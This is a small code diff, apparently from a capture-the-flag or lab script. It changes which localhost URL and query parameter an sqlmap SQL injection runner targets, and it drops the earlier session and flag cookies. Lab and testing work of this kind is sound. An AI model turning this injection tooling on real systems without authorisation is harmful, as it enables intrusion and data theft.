@@ -76,12 +76,12 @@ except:
 visible_chars = [chr(i) for i in range(32, 127)]
 
 config = Configuration(
-    open_url='http://localhost:5000/items?id=',
-    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'},
-    cookie='pma_lang=en; PHPSESSID=850f0124b1e274eccf6e9e13d8131e6c; {flag}=92262bf907af914b95a0fc33c3f33bf6',
+    open_url='http://localhost:3000/rest/products/search?q=',
+    headers={},
+    cookie='',
 )
 
-sqlmap = SqlmapRunner(config.open_url, vulernable_param='id', default_vulnerable_param_value='1')
+sqlmap = SqlmapRunner(config.open_url, vulernable_param='q', default_vulnerable_param_value='1')
 
 if run_sqlmap:
     print('Running sqlmap...')
